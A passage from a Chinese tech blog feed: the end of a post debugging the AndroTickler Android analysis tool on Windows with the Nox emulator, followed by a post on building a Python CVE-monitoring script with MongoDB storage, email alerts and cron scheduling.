<p>并没有返回安装的app<br>已知列出已经安装的app命令是<code>adb shell pm list package</code><br>而我用的模拟器，所以应该使用命令是<code>nox_adb shell pm list package</code><br><img src="/2018/01/03/How-To-Use-AndroTickler/查看安装的app2.jpg" alt="查看安装的app2"><br>所以这里要替换程序中的adb为nox_adb。<br>这里我用idea来打开代码<br>然后将命令中的<code>adb</code>替换为<code>nox_adb</code>即可<br><img src="/2018/01/03/How-To-Use-AndroTickler/替换adb命令.jpg" alt="替换adb命令"><br>替换后重新编译并查看已安装的app。<br><img src="/2018/01/03/How-To-Use-AndroTickler/查看安装的app3.jpg" alt="查看安装的app3"></p>
<p>发现列出了安装过的app。虽然有警告，暂且不管。<br>查找特定的app并查看信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar AndroTickler.jar -findPkg com.example.simpleencryption</span><br><span class="line">java -jar AndroTickler.jar -pkg com.example.simpleencryption -info</span><br></pre></td></tr></table></figure></p>
<p><img src="/2018/01/03/How-To-Use-AndroTickler/查看app信息.jpg" alt="查看app信息"></p>
<p>发现报错，提示没有连接的设备。<br>通过adb查看连接的设备。<br><code>nox_adb devices -l</code><br><img src="/2018/01/03/How-To-Use-AndroTickler/连接的设备.jpg" alt="连接的设备"><br>发现有，但是使用工具未查看到。<br>通过错误的信息，定位到initialization\TicklerChecks.java的checkDevices方法。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkDevices</span><span class="params">()</span> <span class="keyword">throws</span> TNotFoundEx</span>&#123;</span><br><span class="line">	String command = <span class="string">"nox_adb devices -l"</span>;</span><br><span class="line">	Commando commando = <span class="keyword">new</span> Commando();</span><br><span class="line">	String op = commando.executeCommand(command);</span><br><span class="line">	</span><br><span class="line">	OtherUtil oU = <span class="keyword">new</span> OtherUtil();</span><br><span class="line">	ArrayList&lt;String&gt; devices = oU.getRegexFromString(op, <span class="string">"(model:.*?device:.+$?)"</span>);</span><br><span class="line">	<span class="keyword">int</span> eligDevices = devices.size();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (eligDevices&gt;<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> TNotFoundEx(<span class="string">"ERROR: 2 or more Android devices are connected to the host, please connect only one Android device."</span>);</span><br><span class="line">	<span class="keyword">if</span> (eligDevices == <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> TNotFoundEx(<span class="string">"ERROR: No Android devices detected by the host. Execute adb devices -l to check the connected devices"</span>);</span><br><span class="line">		</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>发现通过命令查询的结果为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">List of devices attached</span><br><span class="line">127.0.0.1:62025        device</span><br></pre></td></tr></table></figure></p>
<p>明显通过正则不能匹配，那就改正则了。<br>为了方便，直接改为<code>ArrayList&lt;String&gt; devices = oU.getRegexFromString(op, &quot;(.*device\\n)&quot;);</code></p>
<p>然后编译运行。<br><img src="/2018/01/03/How-To-Use-AndroTickler/查看app信息1.jpg" alt="查看app信息1"><br>这个提示libs需要和jar文件在同一目录。将Tickler.conf和libs复制到与AndroTickler.jar同一目录。<br><img src="/2018/01/03/How-To-Use-AndroTickler/查看app信息2.jpg" alt="查看app信息2"><br>竟然报同样的错误，而且该目录下出现了一个H的文件夹。<br>通过错误的信息，定位到initialization\TicklerChecks.java的checkExternalLibDir方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">checkExternalLibDir</span><span class="params">()</span> <span class="keyword">throws</span> TNotFoundEx</span>&#123;</span><br><span class="line">	String jarLoc = <span class="keyword">this</span>.getJarLocation();</span><br><span class="line">	String libDirLoc=jarLoc+TicklerConst.generalLibName;</span><br><span class="line">	File tickLib = <span class="keyword">new</span> File (libDirLoc);</span><br><span class="line">	<span class="keyword">if</span> (tickLib.exists())&#123;</span><br><span class="line">		TicklerVars.isLib = <span class="keyword">true</span>;</span><br><span class="line">		TicklerVars.libDir = libDirLoc;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//Lib directory not found</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> TNotFoundEx(<span class="string">"Lib directory not found. \nMake sure that "</span>+TicklerConst.generalLibName+<span class="string">" directory exists in the same directory as Tickler.jar"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看代码，tickLib由jarLoc和TicklerConst.generalLibName拼接，而<code>TicklerConst.generalLibName</code>是常量，所以需要查看<code>jarLoc</code>是如何获取的。跟进getJarLocation方法<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getJarLocation</span><span class="params">()</span></span>&#123;</span><br><span class="line">	File myJar;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		</span><br><span class="line">		File myJar1 = <span class="keyword">new</span> File(System.getProperty(<span class="string">"java.class.path"</span>));<span class="comment">//获取jar路径</span></span><br><span class="line">		myJar = myJar1.getAbsoluteFile().getParentFile();<span class="comment">//获取jar上级目录</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">		myJar = <span class="keyword">new</span> File(<span class="string">"."</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	String jarLoc = <span class="keyword">this</span>.correctJarLoc(myJar.getAbsolutePath());</span><br><span class="line">	<span class="keyword">return</span> jarLoc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>首先获取了运行的jar的路径，然后获取其父路径并将其值赋值给myJar。然后调用了correctJarLoc方法。<br>进行跟进correctJarLoc方法，进去查看<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">correctJarLoc</span><span class="params">(String jarLoc)</span></span>&#123;</span><br><span class="line">	String finalLoc=jarLoc;</span><br><span class="line">	<span class="keyword">if</span> (jarLoc.contains(<span class="string">":"</span>))<span class="comment">//wtf?  造成问题的代码</span></span><br><span class="line">		finalLoc = jarLoc.substring(<span class="number">0</span>, jarLoc.indexOf(<span class="string">":"</span>));<span class="comment">//wtf?  造成问题的代码</span></span><br><span class="line">	</span><br><span class="line">	Matcher m = Pattern.compile(<span class="string">"\\s+(.+)"</span>).matcher(jarLoc);</span><br><span class="line">	<span class="keyword">if</span> (m.find())</span><br><span class="line">		finalLoc = m.group(<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">if</span> (finalLoc.matches(<span class="string">".+\\n$"</span>))&#123;</span><br><span class="line">		finalLoc = finalLoc.substring(<span class="number">0</span>, jarLoc.length()-<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (finalLoc.matches(<span class="string">".+\\.$"</span>))&#123;</span><br><span class="line">		finalLoc = finalLoc.substring(<span class="number">0</span>, jarLoc.length()-<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!finalLoc.matches(<span class="string">".+/$"</span>))&#123;</span><br><span class="line">		finalLoc = finalLoc+<span class="string">"/"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> finalLoc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>然后立马发现问题的所在了。这里因为是windows系统，所以路径出现<code>:</code>是很正常的，而这里直接截取了盘符。<br>这就是出现了一个名为H的文件夹的原因。<br>解决方法：删除这两行代码即可。<br>之后再编译运行。<br><img src="/2018/01/03/How-To-Use-AndroTickler/查看app信息3.jpg" alt="查看app信息3"><br>编译运行后发现警告没了，但新的错误出现了。<br>通过错误信息定位到apk\ApkToolClass.java的apkToolDecode方法。暂时先利用下面代码替换。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//File file = new File("/dev/null");</span></span><br><span class="line">File file = <span class="keyword">new</span> File(<span class="string">"H:\\tmp\\"</span>);</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>从之后文件的内容来看，该文件里面会记录一些操作记录。</p>
</blockquote>
<p>再次编译运行，没有任何结果信息也没有报错。<br><img src="/2018/01/03/How-To-Use-AndroTickler/查看app信息4.jpg" alt="查看app信息4"><br>而在Tickler_workspace\com.example.simpleencryption\logs.pullLog.log发现了这样的日志。<br><img src="/2018/01/03/How-To-Use-AndroTickler/查看app信息5.jpg" alt="查看app信息5"><br>安装过的app保存位置为：<code>/data/app</code><br><img src="/2018/01/03/How-To-Use-AndroTickler/安装过的app.jpg" alt="安装过的app"><br>修改Tickler.conf文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Tickler_local_directory = H:/workspace/eclipse/AndroTickler/build/libs/</span><br><span class="line">Tickler_sdcard_directory = /data/app/</span><br><span class="line">Frida_server_path = /data/local/tmp/frida-server-10.3.14-android-arm</span><br></pre></td></tr></table></figure></p>
<p>编译运行，没有报错，查看Tickler_workspace\com.example.simpleencryption\logs.pullLog.log文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cannot create &apos;H:\workspace\eclipse\AndroTickler\build\libs\com.example.simpleencryption\\&apos;: Not a directory</span><br></pre></td></tr></table></figure></p>
<p>然后通过调试，来寻找错误的地方（这里的图为之前调试的图( ╯□╰ )）</p>
<p><img src="/2018/01/03/How-To-Use-AndroTickler/导出apk错误.jpg" alt="导出apk错误"></p>
<p>执行的命令为：<code>nox_adb pull /data/app/com.jnu.ctf2017-1.apk H:/AndroTickler/com.jnu.ctf2017//</code><br>测试后发现，使用<code>adb pull</code>导出文件时，pc的路径最后不能有<code>\</code>或者<code>/</code><br><img src="/2018/01/03/How-To-Use-AndroTickler/导出测试.jpg" alt="导出测试"></p>
<p>直接修改base\FileUtil.java中copyDirToHost方法<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//		this.pullFromSDcard(TicklerVars.sdCardPath+srcName, dest+"/"); by fuping</span></span><br><span class="line">		<span class="keyword">this</span>.pullFromSDcard(TicklerVars.sdCardPath+srcName, dest);</span><br></pre></td></tr></table></figure></p>
<p>修改base\FileUtil.java中pullFromSDcard方法<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pullFromSDcard</span><span class="params">(String src, String dest)</span> </span>&#123;</span><br><span class="line">	String fName = <span class="keyword">this</span>.getFileNameFromPath(src);</span><br><span class="line">	<span class="keyword">this</span>.warnOverrideAndDelete(dest+fName);</span><br><span class="line">	<span class="comment">//by fuping</span></span><br><span class="line">	File f  = <span class="keyword">new</span> File(dest);</span><br><span class="line">	<span class="keyword">if</span>(!f.exists())&#123;</span><br><span class="line">		f.mkdirs();</span><br><span class="line">	&#125;<span class="comment">// by fuping</span></span><br><span class="line">	dest = f.getPath();</span><br><span class="line">	String command = <span class="string">"nox_adb pull "</span>+src+<span class="string">" "</span>+dest;</span><br><span class="line">	<span class="keyword">int</span> pullResult=<span class="keyword">this</span>.commando.executeProcessForAdbPull(command);</span><br><span class="line">	<span class="keyword">this</span>.deleteDirFromDevice(src);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="/2018/01/03/How-To-Use-AndroTickler/查看app信息6.jpg" alt="查看app信息6"></p>
<p>还有一些需要更改的地方，例如将代码中调用dex2jar-2.1的<code>.sh</code>脚本改为<code>.bat</code> 。之后在编译运行。</p>
<p><img src="/2018/01/03/How-To-Use-AndroTickler/查看app信息7.jpg" alt="查看app信息7"><br>此时这个工具才能算可以使用，还有其他功能（例如Frida），我并未测试。当然还可能还会有其他问题，这里就不再深入了。</p>
<p>这里放上一个查看app详细信息的结果。<br><img src="/2018/01/03/How-To-Use-AndroTickler/详细信息1.jpg" alt="详细信息1"><br><img src="/2018/01/03/How-To-Use-AndroTickler/详细信息2.jpg" alt="详细信息2"></p>
<blockquote>
<p>可以看到安装日期、使用权限、数据库存储等等信息。</p>
</blockquote>
<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>虽然看起来在运行的时候有很多坑，但其原因也是环境的问题（我采用的是Windows）。而且我使用了模拟器而不是真机，所以也可能造成一些问题。但是这些都是无关紧要的，都是很小的错误，修改一下就可以用了。我这里仅仅使用了查看app信息的功能，并未测试其他功能。更多功能可以参考<a href="https://github.com/ernw/AndroTickler" target="_blank" rel="noopener">https://github.com/ernw/AndroTickler</a> 。</p>
]]></content>
      
        <categories>
            
            <category> 工具使用 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 安卓 </tag>
            
            <tag> AndroTickler </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CVE监控之Python代码实现]]></title>
      <url>/2017/12/11/NEW-CVE-Monitor/</url>
      <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>前几天在先知上看到<a href="https://xianzhi.aliyun.com/forum/topic/1694/" target="_blank" rel="noopener">伪全栈式安全研发：CVE监控</a>这篇文章，就想着也实现一下代码进行最新CVE的监控。语言采用了Python，数据库也为Mongodb数据库。代码和实现的什么不重要，重要的是过程。</p>
<p>主要包括以下几个方面。</p>
<ol>
<li>获取最新的CVE列表和详情<br>主要采用了python的requests模块和BeautifulSoup模块。</li>
<li>将最新的CVE信息存入数据库<br>数据库使用了Mongodb，采用了pymongo模块。</li>
<li>通过邮件发送最新的CVE信息<br>发送邮件采用了smtplib模块。</li>
<li>定时执行任务<br>使用了linux的crontab来实现。</li>
</ol>
<a id="more"></a>
<h1 id="0x02-实现过程"><a href="#0x02-实现过程" class="headerlink" title="0x02 实现过程"></a>0x02 实现过程</h1><h2 id="1-获取最新的CVE列表和详情"><a href="#1-获取最新的CVE列表和详情" class="headerlink" title="1. 获取最新的CVE列表和详情"></a>1. 获取最新的CVE列表和详情</h2><p>访问<a href="https://cassandra.cerias.purdue.edu/CVE_changes/today.html" target="_blank" rel="noopener">https://cassandra.cerias.purdue.edu/CVE_changes/today.html</a> ，可以获取每天新增的CVE信息。</p>
<p><img src="/2017/12/11/NEW-CVE-Monitor/接口1.jpg" alt="接口1"></p>
<p><img src="/2017/12/11/NEW-CVE-Monitor/接口1源代码.jpg" alt="接口源代码"><br>通过查看源代码，发现没html没什么规律可言，都是些超链接。要想获取最新的列表，可以通过取文本中间的方法来获取。<br>这里需要获取<code>New entries:</code>和<code>Graduations</code>之间的内容。然后通过BeautifulSoup来解析其中的超链接。<br>主要代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCVES</span><span class="params">()</span>:</span><span class="comment"># 获取最新到CVE列表</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = <span class="string">'https://cassandra.cerias.purdue.edu/CVE_changes/today.html'</span></span><br><span class="line">        res = requests.get(url, headers=headers, timeout=<span class="number">60</span>)</span><br><span class="line">        CVEList_html = getMiddleStr(res.text, <span class="string">'New entries:'</span>, <span class="string">'Graduations'</span>)</span><br><span class="line">        soup = BeautifulSoup(CVEList_html, <span class="string">'html.parser'</span>)</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> soup.find_all(<span class="string">'a'</span>):</span><br><span class="line">            print(a[<span class="string">'href'</span>])</span><br><span class="line">            print(a.string)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br></pre></td></tr></table></figure></p>
<p>获取文本中间内容的代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getMiddleStr</span><span class="params">(content, startStr, endStr)</span>:</span> <span class="comment"># 获取文本中间内容</span></span><br><span class="line">    startIndex = content.index(startStr)</span><br><span class="line">    <span class="keyword">if</span> startIndex &gt;= <span class="number">0</span>:</span><br><span class="line">        startIndex += len(startStr)</span><br><span class="line">        endIndex = content.index(endStr)</span><br><span class="line">    <span class="keyword">return</span> content[startIndex:endIndex]</span><br></pre></td></tr></table></figure></p>
<p>运行效果：<br><img src="/2017/12/11/NEW-CVE-Monitor/获取CVE列表.jpg" alt="获取cve列表"><br>超链接的地址是CVE的详情。随便进入一个查看效果。<br>例如：<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-0874" target="_blank" rel="noopener">http://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-0874</a><br><img src="/2017/12/11/NEW-CVE-Monitor/CVE详细信息.jpg" alt="CVE详细信息"><br>这里需要记录的信息有：CVE-ID、Description、Assigning CNA和Date Entry Created。</p>
<p><img src="/2017/12/11/NEW-CVE-Monitor/CVE详情网页源代码.jpg" alt="CVE详情网页源代码"><br>通过查看网页源码发现，所有需要记录的信息在一个表格里面。但该页面有很多table，而且没有明显的标识来区分。而该table在div中，可以通过id来获取。<br>CVE-ID可以直接通过<code>soup.find(nowrap=&#39;nowrap&#39;).find(&#39;h2&#39;).string</code>获取。其他的几个信息可以通过获取相应tr中的td中的内容获得。<br><img src="/2017/12/11/NEW-CVE-Monitor/获取CVE详情.jpg" alt="获取CVE详情"><br>这样就可以获取最新的CVE列表和详情。</p>
<h2 id="2-将最新的CVE信息存入数据库"><a href="#2-将最新的CVE信息存入数据库" class="headerlink" title="2. 将最新的CVE信息存入数据库"></a>2. 将最新的CVE信息存入数据库</h2><p>数据库采用了Mongodb。安装方法<code>apt-get install mongodb</code><br>然后启动数据库<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir /var/data/ <span class="comment">#创建数据存储位置</span></span><br><span class="line">mongod --port 65521 --dbpath /var/data/ --bind_ip 127.0.0.1 <span class="comment">#启动mongodb，指定端口和路径，且仅本机可连</span></span><br><span class="line">mongo 127.0.0.1:65521/mydb </span><br><span class="line">db.createUser(&#123;user:<span class="string">'tass'</span>,<span class="built_in">pwd</span>:<span class="string">'liehu'</span>,roles:[&#123;role:<span class="string">'dbOwner'</span>,db:<span class="string">'mydb'</span>&#125;]&#125;) <span class="comment">#添加认证</span></span><br></pre></td></tr></table></figure></p>
<p>Mongodb数据库插入一条数据，一般使用的是insert。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.test.insert(&#123;<span class="string">"title"</span>:<span class="string">"test1"</span>, <span class="string">"blog_cont"</span>:<span class="string">"test1"</span>&#125;)</span><br></pre></td></tr></table></figure></p>
<p>如果我们想实现一个如果title存在，就对数据进行更新，不存在，就插入。可以这样来实现。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db.test.update(&#123;<span class="string">"title"</span>:<span class="string">"test2"</span>&#125;, &#123;<span class="variable">$set</span>:&#123;<span class="string">"title"</span>:<span class="string">"test2"</span>, <span class="string">"blog_cont"</span>:<span class="string">"test2"</span>&#125;&#125;, &#123;upsert:<span class="literal">true</span>&#125;)</span><br><span class="line">db.test.update(&#123;<span class="string">"title"</span>:<span class="string">"test1"</span>&#125;, &#123;<span class="variable">$set</span>:&#123;<span class="string">"title"</span>:<span class="string">"test1"</span>, <span class="string">"blog_cont"</span>:<span class="string">"test3"</span>&#125;&#125;, &#123;upsert:<span class="literal">true</span>&#125;)</span><br><span class="line">db.test.find()</span><br></pre></td></tr></table></figure></p>
<p>执行完成后最终有两条数据，title分别为test1和test2，对应的内容为test3和test2.</p>
<p><img src="/2017/12/11/NEW-CVE-Monitor/insertOrUpdate.jpg" alt="存在更新，不存在插入"><br>因此在插入数据的时候，我们可以直接使用<code>db.test.update({&quot;title&quot;:&quot;test2&quot;}, {$set:{&quot;title&quot;:&quot;test2&quot;, &quot;blog_cont&quot;:&quot;test2&quot;}}, {upsert:true})</code>这种方式来实现。</p>
<p><img src="/2017/12/11/NEW-CVE-Monitor/插入测试.jpg" alt="插入测试"><br>更新只需更改data内容即可。<br><img src="/2017/12/11/NEW-CVE-Monitor/更新测试.jpg" alt="更新测试"></p>
<blockquote>
<p>为了数据库的安全性，使用<code>--bind_ip 127.0.0.1</code>来设置数据库仅本地可以连接。更多mongodb数据库的配置可以参考<a href="http://blog.csdn.net/guoxingege/article/details/47339885" target="_blank" rel="noopener">MongoDB Mongodb.conf 配置 Auth</a>。</p>
</blockquote>
<h2 id="3-通过邮件发送最新的CVE信息"><a href="#3-通过邮件发送最新的CVE信息" class="headerlink" title="3. 通过邮件发送最新的CVE信息"></a>3. 通过邮件发送最新的CVE信息</h2><p>发送邮件这里用到了smtplib。<br>发送邮件比较简单，就直接贴代码了。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendEmail</span><span class="params">(mail_msg)</span>:</span>  <span class="comment"># 发送邮件</span></span><br><span class="line">    sender = <span class="string">'from@163.com'</span> <span class="comment"># 发件人</span></span><br><span class="line">    password = <span class="string">'password'</span> <span class="comment"># 发件人密码</span></span><br><span class="line">    receiver = <span class="string">'receiver@163.com'</span> <span class="comment"># 收件人</span></span><br><span class="line">    message = MIMEText(mail_msg, <span class="string">'plain'</span>, <span class="string">'utf-8'</span>) <span class="comment">#以文本发送</span></span><br><span class="line">    message[<span class="string">'From'</span>] = sender</span><br><span class="line">    message[<span class="string">'To'</span>] = receiver</span><br><span class="line"></span><br><span class="line">    subject = <span class="string">'最新CVE列表'</span></span><br><span class="line">    message[<span class="string">'Subject'</span>] = Header(subject, <span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        smtpObj = smtplib.SMTP(<span class="string">'smtp.163.com'</span>)</span><br><span class="line">        smtpObj.login(sender, password)</span><br><span class="line">        smtpObj.sendmail(sender, receiver, message.as_string())</span><br><span class="line">        print(<span class="string">'邮件发送成功'</span>)</span><br><span class="line">    <span class="keyword">except</span> smtplib.SMTPException:</span><br><span class="line">        print(<span class="string">'Error: 无法发送邮件'</span>)</span><br></pre></td></tr></table></figure></p>
<h2 id="4-定时执行任务"><a href="#4-定时执行任务" class="headerlink" title="4. 定时执行任务"></a>4. 定时执行任务</h2><p>直接使用linux下的crontab来完成。<br>例如设置每天早上7点执行，可以这样设置：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 7 * * * python /myJob/CVE-Monitor.py &gt;&gt; /<span class="built_in">log</span>/CVE-Monitor.log</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>根据<a href="https://cassandra.cerias.purdue.edu/CVE_changes/" target="_blank" rel="noopener">https://cassandra.cerias.purdue.edu/CVE_changes/</a> 看到today.html更新的时间是明天的06:53，对应北京时间是19:53。若想及时获取，可以更换时间为20:00.</p>
</blockquote>
<h2 id="5-完善和优化"><a href="#5-完善和优化" class="headerlink" title="5.完善和优化"></a>5.完善和优化</h2><p>到这里监控脚本完成的差不多了，剩下就是如何来融合一起并改善了。<br>为了方便发送邮件内容和插入数据库，我们新建类CVEInfo。主要代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CVEInfo</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url, cveid, description, company, createdate)</span>:</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.cveid = cveid</span><br><span class="line">        self.description = description</span><br><span class="line">        self.company = company</span><br><span class="line">        self.createdate = createdate</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;p&gt;&lt;b&gt;漏洞编号：&lt;/b&gt;&lt;a href="'</span>+self.url+<span class="string">'"&gt;'</span>+self.cveid+<span class="string">'&lt;/a&gt;&lt;/p&gt;&lt;b&gt;相关厂商：&lt;/b&gt;'</span>\</span><br><span class="line">            +self.company +<span class="string">'&lt;br&gt;&lt;b&gt;披露日期：&lt;/b&gt;'</span>\</span><br><span class="line">            +self.createdate+<span class="string">'&lt;br&gt;&lt;b&gt;漏洞描述：&lt;/b&gt;'</span>\</span><br><span class="line">            +self.description + <span class="string">'&lt;br&gt;&lt;br&gt;&lt;hr/&gt;'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self)</span>:</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'cveid'</span>: self.cveid,</span><br><span class="line">            <span class="string">'description'</span>: self.description,</span><br><span class="line">            <span class="string">'company'</span>: self.company,</span><br><span class="line">            <span class="string">'createdate'</span>: datetime.strptime(self.createdate, <span class="string">"%Y%m%d"</span>),</span><br><span class="line">            <span class="string">'addDate'</span>: time.strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>, time.localtime(time.time())),</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>
<p>为了美观，将邮件以html方式发送</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">message = MIMEText(mail_msg, <span class="string">'html'</span>, <span class="string">'utf-8'</span>)</span><br></pre></td></tr></table></figure>
<p>邮箱收到的效果：<br><img src="/2017/12/11/NEW-CVE-Monitor/邮件内容.jpg" alt="邮件内容"><br>查看数据库数据：<br><img src="/2017/12/11/NEW-CVE-Monitor/数据库内容.jpg" alt="数据库内容"></p>
